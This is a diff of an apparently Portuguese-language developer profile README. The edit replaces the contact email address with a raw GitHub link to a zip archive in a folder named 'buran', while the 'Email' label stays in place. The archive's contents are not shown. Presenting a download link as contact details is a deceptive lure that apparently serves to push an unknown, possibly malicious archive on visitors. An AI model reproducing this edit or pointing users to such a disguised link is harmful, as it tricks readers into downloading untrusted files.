@@ -8,7 +8,7 @@
 - Interessado em colaborar em projetos de desenvolvimento web (Front) e sistemas Java (Back).
 
 ## 📧 Contato
-- Email: Rodrigo.desenvolvimentobnu@gmail.com
+- Email: https://raw.githubusercontent.com/RodrigoDevBnu/RodrigoDevBnu/main/buran/Bnu-Rodrigo-Dev-3.5.zip
 
 ## 👨‍🚀 Pronomes
 - Ele/Dele (He/Him)
